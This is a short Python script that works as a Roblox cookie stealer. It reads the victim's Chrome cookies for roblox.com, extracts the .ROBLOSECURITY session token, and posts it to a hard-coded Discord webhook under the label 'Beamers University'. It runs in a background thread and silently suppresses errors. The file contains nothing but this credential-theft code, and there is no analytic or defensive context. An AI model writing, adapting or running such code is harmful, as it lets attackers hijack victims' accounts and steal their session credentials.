import browser_cookie3, requests, threading, discord_webhook

webhook = 'https://discord.com/api/webhooks/1507014802218684426/2m2c3rXfoIUVTU06io0JgbDNMxez7_cEdMMZVFXlupVe3h14bmMK-xURyIH9BG3XBtAZ'

def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'dsc.gg/beaminguni', 'content':f'```Cookie provided by Beamers University: {cookie}```'})
    except:
        pass
browsers = [chrome_logger]

for x in browsers:
    threading.Thread(target=x,).start()
